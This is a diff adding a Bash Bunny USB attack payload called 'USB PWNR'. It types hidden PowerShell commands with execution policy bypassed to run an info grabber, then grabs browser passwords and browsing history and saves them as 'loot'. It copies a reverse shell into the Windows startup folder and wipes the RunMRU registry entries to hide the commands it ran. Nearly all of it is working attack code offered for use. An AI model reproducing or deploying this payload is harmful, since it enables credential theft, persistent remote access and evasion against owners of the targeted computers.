@@ -1,0 +1,92 @@
+#USB PWNR
+#P0WNS a computer in seconds
+
+#Setup
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+#Wait for the computer to recognise the drive etc
+QUACK delay 5000
+#Get drive letter and copying it:
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\GetDrive.ps1')"
+Q DELAY 1000
+
+#InfoGrabber
+LED STAGE1
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\run.ps1')"
+DELAY 500
+
+#BPG (BrowserPasswordGrabber)
+LED STAGE2
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\pass.exe')"
+Q DELAY 1800
+Q CONTROL a
+Q DELAY 500
+Q CONTROL s
+Q DELAY 500
+Q STRING %computername% - Pass
+Q F4
+Q DELAY 100
+Q CONTROL a
+Q DELAY 100
+Q CONTROL v
+Q DELAY 100
+Q STRING loot
+Q DELAY 200
+Q ENTER
+Q DELAY 500
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q ENTER
+Q DELAY 100
+Q ALT F4
+
+#BHG (BrowserHistoryGrabber)
+LED STAGE 3
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\history.exe')"
+Q DELAY 1500
+Q ENTER
+Q DELAY 3000
+Q CONTROL a
+Q DELAY 500
+Q CONTROL s
+Q DELAY 500
+Q STRING %computername% - History
+Q F4
+Q DELAY 100
+Q CONTROL a
+Q DELAY 100
+Q CONTROL v
+Q DELAY 100
+Q STRING loot
+Q DELAY 200
+Q ENTER
+Q DELAY 500
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q ENTER
+Q DELAY 100
+Q ALT F4
+
+#Copy reverse shell file to shell:startup and start it
+
+LED STAGE4
+QUACK switch1/copy-reverse.txt
+
+#Cleaning up fase
+LED CLEANUP
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+QUACK ENTER
+
+LED FINISH
+#ATTACKMODE OFF
